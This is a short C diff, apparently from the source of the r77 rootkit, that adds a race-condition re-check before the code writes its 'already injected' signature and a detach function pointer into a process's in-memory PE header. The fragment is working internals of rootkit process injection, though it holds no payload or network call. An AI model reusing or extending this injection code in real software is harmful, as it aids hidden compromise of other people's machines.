@@ -34,14 +34,18 @@ BOOL WriteR77Header(WORD signature, LPVOID detachAddress)
 			DWORD oldProtect;
 			if (VirtualProtectEx(GetCurrentProcess(), module, 512, PAGE_READWRITE, &oldProtect))
 			{
-				// The current process is now marked as injected and therefore, cannot be injected again.
-				*signaturePtr = signature;
+				// Check again right before writing to mitigate a race condition.
+				if (*signaturePtr != R77_SIGNATURE && *signaturePtr != R77_SERVICE_SIGNATURE && *signaturePtr != R77_HELPER_SIGNATURE)
+				{
+					// The current process is now marked as injected and therefore, cannot be injected again.
+					*signaturePtr = signature;
 
-				// Write a function pointer that can be invoked using NtCreateThreadEx to detach the injected library gracefully.
-				*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)detachAddress;
+					// Write a function pointer that can be invoked using NtCreateThreadEx to detach the injected library gracefully.
+					*(PDWORD64)&module[sizeof(IMAGE_DOS_HEADER) + 2] = (DWORD64)detachAddress;
 
-				VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
-				result = TRUE;
+					VirtualProtectEx(GetCurrentProcess(), module, 512, oldProtect, &oldProtect);
+					result = TRUE;
+				}
 			}
 		}
 	}
